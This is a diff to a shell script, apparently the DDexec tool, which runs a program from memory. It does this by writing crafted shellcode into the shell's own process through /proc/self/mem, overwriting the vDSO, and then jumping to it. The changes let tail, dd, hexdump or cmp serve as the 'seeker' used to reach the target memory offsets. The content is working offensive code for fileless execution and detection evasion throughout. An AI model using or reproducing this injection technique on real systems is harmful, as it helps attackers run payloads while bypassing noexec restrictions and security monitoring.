@@ -1,15 +1,17 @@
 #!/bin/sh
 
-filename=/bin/dd
-
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
-# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'.
-# In ARM64 use `set *(int*)$pc=0xd503201f'.
+# Then in gdb just use `set $pc+=2' and you will be able to `si'.
+# In ARM64 use `set $pc+=4'.
 if [ -z "$DEBUG" ]; then DEBUG=0; fi
 
-# If /bin/dd is not executable by your user you may try to run it through the
-# the loader (typically ld).
+# If the seeker binary is not executable by your user, you may try to run it
+# through the loader (typically ld.so).
 if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi
+
+# Currently tail is the default binary used to lseek() through the mem file.
+if [ -z "$SEEKER" ]; then seeker=tail; else seeker="$SEEKER"; fi
+seeker=$(command -v "$seeker") # Harry Potter vibes? Nah.
 
 # Endian conversion
 endian()
@@ -21,6 +23,7 @@ sc_chunk()
 {
     echo "$sc_array" | grep -w $1 | cut -f2
 }
+# Load the aarch64 register with number $regnum with the value $addr
 # load_imm $regnum $addr
 load_imm()
 {
@@ -407,7 +410,7 @@ craft_shellcode()
     else                                                        # Static binary
         sc=$sc$(eval echo $(sc_chunk jmpbin)) # Just jump to the binary's entry
     fi
-    # Nothing happened here, dd never existed.
+    # Nothing happened here, this program never existed.
     # It was all a dream!
     sc=$sc$(eval echo $(sc_chunk jmp))
 
@@ -455,7 +458,7 @@ loop	00000014
 '
 else
     echo "DDexec: Error, this architecture is not supported." >&2
-    exit
+    exit 1
 fi
 
 # Program we are trying to run
@@ -479,15 +482,15 @@ then
     interp=$(echo $bin | base64 -d | tail -c +$(($interp_off + 1)) |\
              head -c $((interp_size - 1)))
 fi
-# Interpreter (loader) for dd
+# Interpreter (loader) for our seeker
 if [ $USE_INTERP -eq 1 ]
 then
-    interp_off=$(search_section file $filename .interp)
+    interp_off=$(search_section file $seeker .interp)
     if [ -n "interp_off" ]
     then
         interp_size=$(echo $interp_off | cut -d' ' -f2)
         interp_off=$(echo $interp_off | cut -d' ' -f1)
-        interp_=$(tail -c +$(($interp_off + 1)) $filename |\
+        interp_=$(tail -c +$(($interp_off + 1)) $seeker |\
                   head -c $((interp_size - 1)))
     fi
 fi
@@ -539,9 +542,39 @@ read syscall_info < /proc/self/syscall
 addr=$(($(echo $syscall_info | cut -d' ' -f9)))
 exec 0< <(printf $data)
 exec 3>/proc/self/mem
-# Write the shellcode
-printf $sc  | $interp_ $filename bs=1 seek=$vdso_addr >&3 2>/dev/null
+
+# Arguments' format for the chosen seeker
+if [ -z "$SEEKER_ARGS" ]
+then
+    if [ $(basename $seeker) = "tail" ]
+    then
+        SEEKER_ARGS='-c +$(($offset + 1))'
+    elif   [ $(basename $seeker) = "dd" ]
+    then
+        SEEKER_ARGS='bs=1 skip=$offset'
+    elif [ $(basename $seeker) = "hexdump" ]
+    then
+        SEEKER_ARGS='-s $offset'
+    elif [ $(basename $seeker) = "cmp" ]
+    then
+        SEEKER_ARGS='-i $offset /dev/null'
+    else
+        echo "DDexec: Unknown seeker. Provide its arguments in SEEKER_ARGS."
+        exit 1
+    fi
+fi
+
+# Overwrite vDSO with our shellcode
+seeker_args=${SEEKER_ARGS/'$offset'/$vdso_addr}
+seeker_args="$(eval echo -n \"$seeker_args\")"
+$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
+printf $sc >&3
+
 exec 3>&-
 exec 3>/proc/self/mem
-# I'm going in, wish me good luck
-printf $jmp | $interp_ $filename bs=1 seek=$addr      >&3 2>/dev/null
+
+# Write jump instruction somewhere it will be found shortly
+seeker_args=${SEEKER_ARGS/'$offset'/$addr}
+seeker_args="$(eval echo -n \"$seeker_args\")"
+$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
+printf $jmp >&3 # The shell doesn't know this command is gonna kill it
